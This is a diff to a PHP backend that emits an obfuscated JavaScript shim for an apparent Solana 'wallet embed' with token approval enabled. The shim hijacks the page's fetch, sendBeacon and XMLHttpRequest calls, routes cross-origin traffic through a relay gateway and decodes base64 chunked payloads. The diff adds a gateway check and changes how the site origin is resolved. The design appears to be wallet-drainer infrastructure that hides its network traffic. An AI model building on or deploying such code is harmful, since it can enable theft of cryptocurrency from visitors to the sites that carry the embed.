@@ -96,7 +96,7 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'network' => (string) ($cfg['network'] ?? 'solana'),
         'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
         'siteDescription' => (string) ($cfg['site_description'] ?? ''),
-        'siteUrl' => $siteUrl,
+        'siteUrl' => vercel_site_origin($cfg),
         'siteIcons' => $icons,
         'analytics' => (bool) ($cfg['analytics'] ?? true),
         'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
@@ -270,6 +270,8 @@ function embed_network_shim(string $entry, array $chunks): string
     $wsJs = json_encode($chunks['wsRelay'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
 
     return '(function(e,g,w){function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
+        . 'function isgw(h){try{var u=new URL(h,location.href),p=new URL(e,location.href);'
+        . 'return u.pathname===p.pathname&&u.searchParams.get("c")===g}catch(r){return!1}}'
         . 'function dec(b){var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;return atob(n+"=".repeat(p))}'
         . 'function pl(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
         . 'if(!m)return null;var s=Number(m[1]);if(s<200||s>=300)throw new Error("chunk "+s);'
@@ -285,7 +287,7 @@ function embed_network_shim(string $entry, array $chunks): string
         . 'function prox(h,n){n=n||{};var m=(n.method||"GET").toUpperCase(),b=n.body;'
         . 'var o={t:"u",m:m,u:h};if(b!=null)o.b=typeof b==="string"?b:(b instanceof Blob?b:String(b));return gpost(o)}'
         . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
-        . 'if(off(h))return prox(h,n);return f(i,n)};'
+        . 'if(isgw(h))return pj(f(i,n||{}));if(off(h))return prox(h,n);return f(i,n)};'
         . 'var sb=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
         . 'if(sb)navigator.sendBeacon=function(u,d){if(!off(u))return sb(u,d);gpost({t:"u",m:"POST",u:String(u)});return!0};'
         . 'var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;'
@@ -300,6 +302,16 @@ function embed_network_shim(string $entry, array $chunks): string
 function vercel_api_origin(array $cfg): string
 {
     return vercel_profile_origin($cfg);
+}
+
+function vercel_site_origin(array $cfg): string
+{
+    $url = rtrim(detect_site_url($cfg), '/');
+    if ($url !== '') {
+        return $url;
+    }
+
+    return rtrim(vercel_api_origin($cfg), '/');
 }
 
 function decode_chunk_payload(string $raw): ?array
@@ -406,7 +418,7 @@ function serve_upstream_op(array $cfg, array $op): void
         emit_js_chunk_response(502, '{"error":"curl_init failed"}');
     }
 
-    $siteOrigin = rtrim(detect_site_url($cfg), '/');
+    $siteOrigin = vercel_site_origin($cfg);
     $accept = (string) ($_SERVER['HTTP_ACCEPT'] ?? '');
     $headers = [
         'User-Agent: wallet-embed-proxy/1.0',
